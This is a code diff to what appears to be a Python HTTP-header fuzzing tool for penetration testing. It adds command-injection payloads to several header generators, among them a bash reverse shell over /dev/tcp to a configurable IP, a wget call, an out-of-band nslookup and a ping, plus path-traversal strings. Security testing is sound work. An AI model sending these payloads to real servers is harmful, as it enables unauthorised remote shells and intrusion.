@@ -1,5 +1,6 @@
 import string
 import random
+from config import *
 
 
 def get_header_values(test, header):
@@ -71,6 +72,9 @@ def get_host_header_values(test):
     if test == 'error':
         items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
         values += [item for item in items]
+    if test == 'command injection':
+        items = command_injection_values()
+        values += [item for item in items]
     return values
 
 
@@ -89,6 +93,9 @@ def get_useragent_header_values(test):
         mobile_user_agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
                               'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',]
         values += [ua for ua in mobile_user_agents] 
+    if test == 'command injection':
+        items = command_injection_values()
+        values += [item for item in items]
     return values
 
 
@@ -157,6 +164,9 @@ def get_connection_header_values(test):
         for i in range(50, 500, 50):
             string_val = 'A' * i
             values.append(string_val)
+    if test == 'command injection':
+        items = command_injection_values()
+        values += [item for item in items]
     return values
 
 
@@ -174,6 +184,9 @@ def get_referer_header_values(test):
     if test == 'authorization':
         addresses = ['', '127.0.0.1', 'localhost', '10.10.1.1']
         values += [addr for addr in addresses]
+    if test == 'command injection':
+        items = command_injection_values()
+        values += [item for item in items]
     return values
 
 
@@ -192,6 +205,23 @@ def get_authorization_header_values(test):
         auths = ['Basic YWRtaW46YWRtaW4=', 'Basic Z3Vlc3Q6Z3Vlc3Q=', 'Digest AAAA', 'Bearer AAAA']
         values += [auth for auth in auths]
     if test == 'error':
-        items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>']
+        items = ['\'', '"', ';', '#', '\\', '}', '{', '<>', '<', '>', '../../', '..\\..\\']
         values += [item for item in items]
+    if test == 'command injection':
+        items = command_injection_values()
+        values += [item for item in items]
+    return values
+
+
+def command_injection_values():
+    ''' Returns values dealing with command injection.
+    '''
+    ip = IP_ADDRESS if IP_ADDRESS else '127.0.0.1'
+    port = PORT if PORT else '80'
+    domain = DOMAIN_NAME if DOMAIN_NAME else 'laconicwolf.com'
+    random_string = get_random_string(8)
+    values = [';ping ' + ip + ' -c 2',
+              ';/bin/bash -i > /dev/tcp/' + ip + '/' + port + '0<&1 2>&1',
+              ';nslookup ' + random_string + '.' + domain,
+              ';wget http://' + ip]
     return values
